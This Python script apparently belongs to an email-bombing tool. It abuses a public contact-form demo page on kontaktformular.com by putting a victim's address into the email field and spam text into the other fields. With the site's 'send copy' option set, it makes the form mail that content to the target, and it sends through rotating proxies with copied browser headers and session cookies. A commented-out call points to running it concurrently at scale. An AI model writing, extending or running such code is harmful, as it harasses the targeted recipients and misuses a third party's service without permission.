from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'PHPSESSID': '46ef57893b14204290b29d6f19a4cd4f',
            '_pk_id.1.250e': '96b71435e88ea68e.1678183264.',
            '_pk_ses.1.250e': '1',
        }

        headers = {
            'authority': 'www.kontaktformular.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryRBjBuZn0Eje0r9Dp',
            'origin': 'https://www.kontaktformular.com',
            'pragma': 'no-cache',
            'referer': 'https://www.kontaktformular.com/en/vorlagen/template11/4-kopie-an/contact.php',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="company"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="title"\r\n\r\nMs.\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="first_name"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="name"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="telephone"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="str"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="str2"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="postal_zip_code"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="city"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="region"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="country"\r\n\r\nAndorra\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="subject"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="message"\r\n\r\ntest\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="mail-copy"\r\n\r\n1\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp\r\nContent-Disposition: form-data; name="en-us-kf-km"\r\n\r\nSend\r\n------WebKitFormBoundaryRBjBuZn0Eje0r9Dp--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post(
            'https://www.kontaktformular.com/en/vorlagen/template11/4-kopie-an/contact.php',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=20
        )

        return response


def main():
    s = 'thankyou'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
